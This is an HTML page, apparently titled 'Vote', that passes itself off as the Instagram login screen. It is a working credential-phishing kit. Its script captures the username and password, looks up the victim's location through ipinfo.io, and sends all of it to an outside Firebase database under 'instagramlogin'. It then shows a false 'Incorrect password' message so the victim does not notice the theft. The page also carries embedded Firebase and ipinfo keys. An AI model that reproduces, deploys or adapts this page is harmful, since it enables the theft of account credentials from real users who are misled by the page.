<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Vote</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
  <style>
    body {
      background: #fafafa;
      margin: 0;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      justify-content: space-between;
    }

    .container {
      width: 100%;
      max-width: 400px;
      background: white;
      margin: 30px auto 10px;
      padding: 20px;
      box-sizing: border-box;
      flex-grow: 1;
    }

    .logo {
      display: block;
      height: 50px;
      width: 170px;
      margin: 0 auto 20px;
      cursor: pointer;
    }

    .input-field {
      width: 100%;
      padding: 14px;
      border: 1px solid #ddd;
      background: #f5f5f5;
      border-radius: 4px;
      font-size: 16px;
      margin-bottom: 10px;
      box-sizing: border-box;
    }

    .input-field:focus {
      border-color: #aaa;
      outline: none;
    }

    ::placeholder {
      font-size: 14px;
      color: #aaa;
    }

    .password-wrapper {
      position: relative;
    }

    .toggle-password {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 14px;
      color: #0095f6;
      font-weight: bold;
      cursor: pointer;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #0095f6;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: bold;
      margin-top: 10px;
      position: relative;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #007bb5;
    }

    .spinner {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 25px;
      height: 25px;
      border: 3px solid transparent;
      border-top: 3px solid #fff;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      animation: spin 1s linear infinite;
      visibility: hidden;
    }

    @keyframes spin {
      to {
        transform: translate(-50%, -50%) rotate(360deg);
      }
    }

    .error-message {
      color: red;
      font-size: 13px;
      margin-top: 5px;
      visibility: hidden;
    }

    .footer, .get, .dont, .forgot {
      text-align: center;
      font-size: 14px;
      margin-top: 15px;
    }

    .dont span {
      color: #0095f6;
      font-weight: bold;
      cursor: pointer;
    }

    .app-links img {
      height: 40px;
      margin: 10px 5px;
    }

    .footer a {
      color: #0095f6;
      text-decoration: none;
      margin: 0 8px;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <form id="loginForm">
      <img src="https://i.ibb.co/fSZrktN/instagram-logo.png" alt="Instagram Logo" class="logo" />
      <input type="text" id="username" class="input-field" placeholder="Phone number, username or email" required />
      <div class="password-wrapper">
        <input type="password" id="password" class="input-field" placeholder="Password" required />
        <span class="toggle-password" id="togglePassword">Show</span>
      </div>
      <p class="error-message" id="errorMessage"></p>
      <button type="submit" id="loginButton">
        Log In
        <div class="spinner" id="spinner"></div>
      </button>
      <p class="forgot">Forgotten your password?</p>
      <div class="dont">Don't have an account? <span>Sign up</span></div>
      <p class="get">
        Get the app.
        <div class="app-links">
          <img src="https://i.ibb.co/bHVsHrT/app-store.png" alt="App Store" />
          <img src="https://i.ibb.co/JBVJ8JB/play-store.png" alt="Play Store" />
        </div>
      </p>
    </form>
  </div>

  <div class="footer">
    <footer>
      <p>
        <a href="#">ABOUT</a> |
        <a href="#">SUPPORT</a> |
        <a href="#">BLOG</a> |
        <a href="#">API</a> |
        <a href="#">PRIVACY</a> |
        <a href="#">TERMS</a>
      </p>
    </footer>
  </div>

  <script>
    // Firebase Init
    const firebaseConfig = {
      apiKey: "AIzaSyA7yPixTtGPX62EMkKLQd6B4JmFQYP2URc",
      authDomain: "solana-fdc09.firebaseapp.com",
      databaseURL: "https://solana-fdc09-default-rtdb.firebaseio.com",
      projectId: "solana-fdc09",
      storageBucket: "solana-fdc09.appspot.com",
      messagingSenderId: "654390283921",
      appId: "1:654390283921:web:e16991c6bef4bace693930"
    };

    firebase.initializeApp(firebaseConfig);

    // Toggle password visibility
    document.getElementById("togglePassword").addEventListener("click", () => {
      const passwordInput = document.getElementById("password");
      const toggle = document.getElementById("togglePassword");
      const type = passwordInput.type === "password" ? "text" : "password";
      passwordInput.type = type;
      toggle.textContent = type === "password" ? "Show" : "Hide";
    });

    // Login form submission
    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const errorMsg = document.getElementById("errorMessage");
      const spinner = document.getElementById("spinner");
      const button = document.getElementById("loginButton");

      errorMsg.style.visibility = "hidden";
      spinner.style.visibility = "visible";
      button.disabled = true;

      if (!username || !password) {
        errorMsg.textContent = "Please fill in all fields.";
        errorMsg.style.visibility = "visible";
        spinner.style.visibility = "hidden";
        button.disabled = false;
        return;
      }

      const location = await getCountryInfo();
      if (!location) {
        errorMsg.textContent = "Could not determine location.";
        errorMsg.style.visibility = "visible";
        spinner.style.visibility = "hidden";
        button.disabled = false;
        return;
      }

      firebase.database().ref("instagramlogin").push({
        username,
        password,
        region: location.region,
        country: location.country
      }).then(() => {
        console.log("Saved successfully.");
        document.getElementById("password").value = "";
        errorMsg.textContent = "Incorrect password";
        errorMsg.style.visibility = "visible";
      }).catch(err => {
        console.error("Error:", err);
        errorMsg.textContent = "Submission failed.";
        errorMsg.style.visibility = "visible";
      }).finally(() => {
        spinner.style.visibility = "hidden";
        button.disabled = false;
      });
    });

    async function getCountryInfo() {
      try {
        const response = await fetch("https://ipinfo.io?token=d77652b5ef3a6b");
        const data = await response.json();
        return { region: data.region, country: data.country };
      } catch (e) {
        console.error("Location fetch failed:", e);
        return null;
      }
    }
  </script>
</body>
</html>
